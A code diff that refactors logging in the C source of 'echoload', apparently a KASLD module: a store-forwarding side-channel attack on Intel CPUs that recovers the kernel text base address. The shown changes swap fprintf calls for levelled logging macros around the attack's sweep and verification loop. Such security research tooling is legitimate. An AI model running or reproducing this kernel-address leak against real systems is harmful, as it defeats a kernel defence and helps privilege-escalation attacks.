@@ -228,15 +228,14 @@ static unsigned long echoload_sweep(int use_tsx) {
    * the whole decision here, so what matters on unfamiliar hardware is whether
    * the winner towered over its neighbours or sat one count above them. */
   if (debug_mode) {
-    fprintf(stderr,
-            "# echoload: hits per slot (threshold %d of %d iterations)\n",
-            ECHOLOAD_HIT_THRESHOLD, ECHOLOAD_ITERATIONS);
+    kasld_info("# echoload: hits per slot (threshold %d of %d iterations)",
+               ECHOLOAD_HIT_THRESHOLD, ECHOLOAD_ITERATIONS);
     for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++)
       if (hits[slot])
-        fprintf(stderr, "#   0x%lx %d%s\n",
-                KERNEL_VIRT_TEXT_MIN + slot * SCAN_STEP, hits[slot],
-                hits[slot] >= ECHOLOAD_HIT_THRESHOLD ? "  <- over threshold"
-                                                     : "");
+        kasld_info("#   0x%lx %d%s", KERNEL_VIRT_TEXT_MIN + slot * SCAN_STEP,
+                   hits[slot],
+                   hits[slot] >= ECHOLOAD_HIT_THRESHOLD ? "  <- over threshold"
+                                                        : "");
   }
 
   /* Return the lowest address above the hit threshold */
@@ -262,35 +261,30 @@ int main(void) {
 
   kasld_info("trying the echoload store-forwarding side-channel ...");
   if (!is_intel_cpu()) {
-    fprintf(stderr, "[-] echoload: not an Intel CPU; attack not applicable\n");
+    kasld_err("echoload: not an Intel CPU; attack not applicable");
     return kasld_disp_absent("not an Intel CPU");
   }
 
   int use_tsx;
 
+/* Named once rather than at each report: the levelled logger is a macro, and a
+ * preprocessor directive inside a macro's arguments is not portable. */
+#if ECHOLOAD_USE_SPECULATION
+  const char *fallback_mode = "speculation";
+#else
+  const char *fallback_mode = "signal handler";
+#endif
+
 #if ECHOLOAD_USE_TSX
   use_tsx = has_rtm();
-  if (use_tsx) {
-    fprintf(stderr, "[.] echoload: using TSX abort mode\n");
-  } else {
-    fprintf(stderr,
-            "[.] echoload: TSX not available, falling back to %s mode\n",
-#if ECHOLOAD_USE_SPECULATION
-            "speculation"
-#else
-            "signal handler"
-#endif
-    );
-  }
+  if (use_tsx)
+    kasld_info("echoload: using TSX abort mode");
+  else
+    kasld_info("echoload: TSX not available, falling back to %s mode",
+               fallback_mode);
 #else
   use_tsx = 0;
-  fprintf(stderr, "[.] echoload: using %s mode\n",
-#if ECHOLOAD_USE_SPECULATION
-          "speculation"
-#else
-          "signal handler"
-#endif
-  );
+  kasld_info("echoload: using %s mode", fallback_mode);
 #endif
 
   if (!use_tsx) {
@@ -300,8 +294,8 @@ int main(void) {
   memset(probe, 1, sizeof(probe));
 
   cache_miss_threshold = detect_flush_reload_threshold();
-  fprintf(stderr, "[.] echoload: cache miss threshold: %zu cycles\n",
-          cache_miss_threshold);
+  kasld_info("echoload: cache miss threshold: %zu cycles",
+             cache_miss_threshold);
 
   /* Pin to a single core to reduce noise */
   pin_cpu(1);
@@ -309,8 +303,8 @@ int main(void) {
   unsigned long addr = echoload_sweep(use_tsx);
 
   if (!addr) {
-    fprintf(stderr, "[-] echoload: no kernel mapping detected "
-                    "(CPU may not be vulnerable)\n");
+    kasld_err("echoload: no kernel mapping detected "
+              "(CPU may not be vulnerable)");
     return kasld_disp_inconclusive(
         "no kernel mapping (CPU may not be vulnerable)");
   }
@@ -319,7 +313,7 @@ int main(void) {
    * match. If any sweep disagrees, the result is rejected entirely. */
   for (int v = 0; v < ECHOLOAD_VERIFY; v++) {
     if (addr != echoload_sweep(use_tsx)) {
-      fprintf(stderr, "[-] echoload: inconsistent results. Aborting ...\n");
+      kasld_err("echoload: inconsistent results. Aborting ...");
       return kasld_disp_inconclusive(
           "inconsistent results (noise); a quieter run may resolve");
     }
@@ -331,7 +325,7 @@ int main(void) {
   bool pti = detect_kpti();
   const char *symbol = pti ? "__entry_text_start" : "_stext";
 
-  fprintf(stderr, "[+] echoload: %s = 0x%016lx\n", symbol, addr);
+  kasld_found("echoload: %s = 0x%016lx", symbol, addr);
   kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, symbol,
                       CONF_TIMING);
 
